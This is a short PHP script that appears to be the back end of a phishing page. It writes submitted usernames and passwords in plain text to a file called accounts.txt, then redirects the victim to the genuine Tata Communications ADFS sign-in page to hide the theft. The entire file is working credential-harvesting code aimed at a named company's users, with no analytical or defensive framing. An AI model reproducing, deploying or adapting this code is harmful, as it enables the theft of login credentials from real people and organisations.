<?php
 if(isset($_POST['submit_btn']))
 {
  $username = $_POST['UserName'];
  $password = $_POST['Password'];
  $text = $username . "," . $password . "\n";
  $fp = fopen('accounts.txt', 'a+');

    if(fwrite($fp, $text))  {

    }
fclose ($fp);  
header("Location: https://adfs.tatacommunications.com/adfs/ls/?username=username%40tatacommunications.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=&client-request-id=760752b4-c515-4461-4f10-0080000000e8");
die(); 
}

 